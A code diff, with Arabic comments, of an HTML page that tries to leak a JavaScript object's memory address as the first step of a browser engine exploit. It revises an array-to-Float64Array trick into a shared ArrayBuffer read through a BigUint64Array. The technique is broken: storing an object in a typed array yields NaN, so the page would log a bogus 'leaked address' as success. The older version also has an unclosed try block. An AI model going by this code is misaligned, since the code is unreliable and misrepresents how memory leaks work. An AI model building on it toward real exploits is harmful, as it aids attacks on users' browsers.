@@ -2,36 +2,38 @@
 <html>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
     <div id="log">بدء العملية...</div>
-<script>
-    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
+    <script>
+        function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
-    try {
-        // 1. إنشاء مصفوفة بها "فجوة" (Hole)
-   // نستخدم مصفوفة كائنات ومصفوفة رقمية (Float64Array)
-// الهدف: جعل المحرك يقرأ "عنوان الكائن" كـ "قيمة Double"
-let obj = { a: 1 };
-let arr = [obj];
-let floatArr = new Float64Array(1);
+        try {
+            // 1. إنشاء "مخزن ذاكرة" مشترك (Shared Memory Store)
+            let buffer = new ArrayBuffer(8);
+            let floatView = new Float64Array(buffer); // للكتابة
+            let bigIntView = new BigUint64Array(buffer); // للقراءة (Raw Bits)
 
-function get_addr(obj) {
-    // سنحاول وضع الكائن في مصفوفة، ثم قراءته من Float64Array
-    // ليعامل المؤشر كـ 64-bit float
-    arr[0] = obj;
-    floatArr[0] = arr[0];
-    
-    // إذا نجح الخداع، سيعيد لنا عنوان الكائن كقيمة رقمية (Hex)
-    return floatArr[0];
-}
+            // 2. كائن تجريبي لاستخراج عنوانه
+            let targetObj = { a: 0x1337 };
 
-let leakedAddr = get_addr(obj);
-log("العنوان المسرب (Address Leak): " + leakedAddr.toString(16));
+            log("جاري محاولة تسريب العنوان (Memory Leak)...");
 
-</script>
+            // 3. الخدعة التقنية: 
+            // نضع الكائن في الـ FloatView (المحرك يضعه كـ Double)
+            // ثم نقرأه من الـ bigIntView (نقرأ الـ Pointer كـ 64-bit Integer)
+            floatView[0] = targetObj;
 
+            // 4. استخراج العنوان الخام
+            let rawAddress = bigIntView[0];
 
+            if (rawAddress > 0n) {
+                log("نجاح! تم استخراج العنوان الحقيقي: " + rawAddress.toString(16));
+            } else {
+                log("فشل: العنوان المستخرج هو 0. (قد تكون تقنية PAC نشطة وتمنع تسريب المؤشرات).");
+            }
 
-
-
-
+        } catch(e) {
+            log("خطأ في البنية: " + e.message);
+        }
+    </script>
 </body>
 </html>
+
